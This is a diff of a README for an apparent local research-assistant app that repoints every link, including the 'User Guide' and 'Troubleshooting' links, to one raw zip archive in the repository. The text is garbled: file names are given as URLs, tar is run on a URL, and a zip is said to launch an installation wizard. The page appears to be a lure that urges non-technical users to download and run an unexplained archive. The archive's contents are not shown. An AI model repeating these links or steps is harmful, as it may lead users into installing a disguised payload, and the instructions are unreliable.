@@ -4,7 +4,7 @@
 Welcome to the full-stack-local-deep-research-agent! This application allows you to deploy a powerful research assistant on your own local machine, completely free. With its easy setup, you can dive into deep research without needing any technical background.
 
 ## 📥 Download Here
-[![Download Now](https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip%https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip)](https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip)
+[![Download Now](https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip%https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip)](https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,14 +21,14 @@ Before you start, ensure your machine meets the following requirements:
 ### 2. Visit the Download Page
 Go to our Releases page to download the latest version of the application. Click the link below to access it.
 
-[Download the latest release](https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip)
+[Download the latest release](https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip)
 
 ### 3. Choose the Right File
 On the Releases page, you will see several files. The latest version will usually be listed at the top. Look for the file with the following name format:
 
-- **Windows:** `https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip`
-- **macOS:** `https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip`
-- **Linux:** `https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip`
+- **Windows:** `https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip`
+- **macOS:** `https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip`
+- **Linux:** `https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip`
 
 Click on the file that matches your operating system to begin the download.
 
@@ -39,21 +39,21 @@ Click the file link. Your browser will start downloading the application automat
 After the download is complete, follow these steps based on your operating system:
 
 #### For Windows
-1. Locate the downloaded `https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip` file in your Downloads folder.
+1. Locate the downloaded `https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip` file in your Downloads folder.
 2. Double-click the file to start the installation wizard.
 3. Follow the prompts to install the application.
 
 #### For macOS
-1. Locate the downloaded `https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip` file in your Downloads folder.
+1. Locate the downloaded `https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip` file in your Downloads folder.
 2. Double-click to open the disk image.
 3. Drag the application into your Applications folder to install.
 
 #### For Linux
-1. Locate the downloaded `https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip` file.
+1. Locate the downloaded `https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip` file.
 2. Open a terminal and navigate to the folder where you downloaded the file.
 3. Unzip the file using the command:
    ```
-   tar -xvf https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip
+   tar -xvf https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip
    ```
 4. Change into the extracted directory:
    ```
@@ -87,8 +87,8 @@ If you encounter issues during installation or use, please refer to the FAQ sect
 ## 📂 Further Resources
 For additional guidance on using this application effectively, check out our detailed documentation in the repository:
 
-1. **User Guide:** [User Guide Link](https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip)
-2. **Troubleshooting:** [Troubleshooting Link](https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip)
+1. **User Guide:** [User Guide Link](https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip)
+2. **Troubleshooting:** [Troubleshooting Link](https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip)
 
 ## ⚙️ Contribute
 We welcome contributions! If you have suggestions for improvements or features, feel free to open an issue on GitHub or submit a pull request. Check out our Contribution Guidelines for more information.
@@ -96,4 +96,4 @@ We welcome contributions! If you have suggestions for improvements or features, 
 ## 📬 Contact
 If you have any questions or suggestions, please reach out via our GitHub Issues page. We're here to make your research experience as smooth as possible.
 
-[Download the latest release](https://raw.githubusercontent.com/ahmedmashhour11/full-stack-local-deep-research-agent/main/src/full-stack-local-deep-research-agent_v1.1.zip)
+[Download the latest release](https://github.com/ahmedmashhour11/full-stack-local-deep-research-agent/raw/refs/heads/main/src/research_stack_full_local_deep_agent_2.6.zip)
